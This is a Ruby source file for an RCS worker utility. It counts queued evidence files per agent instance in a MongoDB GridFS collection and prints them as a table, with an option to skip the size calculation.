# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/path_utils'

require_release 'rcs-db/db'
require_release 'rcs-db/grid'
require_release 'rcs-db/evidence_dispatcher'

module RCS
module Worker

class WorkerBacklog
  include Singleton
  include RCS::Tracer

  def run(options)

    # config file parsing
    return 1 unless RCS::DB::Config.instance.load_from_file

    # connect to MongoDB
    return 1 unless RCS::DB::DB.instance.connect

    # calculate the number and the size of all the evidece for each instance
    entries = {}

    db = Mongoid.session(:worker)

    pipeline = if options[:without_size]
      [{'$group' => {'_id' => '$filename', 'count' => {'$sum' => 1}}}]
    else
      [{'$group' => {'_id' => '$filename', 'count' => {'$sum' => 1}, 'size' => {'$sum' => '$length'}}}]
    end

    db['grid.evidence.files'].aggregate(pipeline).each do |doc|
      entries[doc['_id']] = doc.symbolize_keys.reject { |k| k == :_id }
    end

    # this will become an array
    entries = entries.sort_by {|k,v| k}

    without_size = !!options[:without_size]

    # table definitions
    table_width = without_size ? 92 : 105
    table_line = '+' + '-' * table_width + '+'

    puts "Options: #{options.inspect}" unless options.empty?
    evidence_count = entries.inject(0) { |size, info| size += info[1][:count].to_i }
    puts "There are #{evidence_count} evidence in queue\n"

    # print the table header
    puts table_line
    puts table_row('instance', 'platform', 'logs', ('size' unless without_size))
    puts table_line

    entries.each do |entry|

      ident = entry[0].slice(0..13)
      instance = entry[0].slice(15..-1)
      agent = ::Item.agents.where({ident: ident, instance: instance}).first

      # in case the agent is not there anymore
      agent = {platform: 'DELETED'} unless agent

      evidence_size = entry[1][:size].to_s_bytes unless without_size
      puts table_row(entry[0], agent[:platform], entry[1][:count], evidence_size)
    end

    puts table_line
    puts

    return 0
  end

  def table_row(*values)
    values.map!(&:to_s)
    values.reject! { |v| v.size == 0 }
    rows = [values[0].center(60), values[1].center(12), values[2].center(18)]
    rows << values[3].center(12) if values[3]
    "|#{rows.join('|')}|"
  end

  # executed from rcs-worker-queue
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    DB.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-worker-queue [options] "
      opts.on('--no-size', 'Do not calculate queue size') { options[:without_size] = true }
    end

    optparse.parse(argv)

    # execute the manager
    return WorkerBacklog.instance.run(options)
  end
end # EvidenceDispatcher

end # ::DB
end # ::RCS
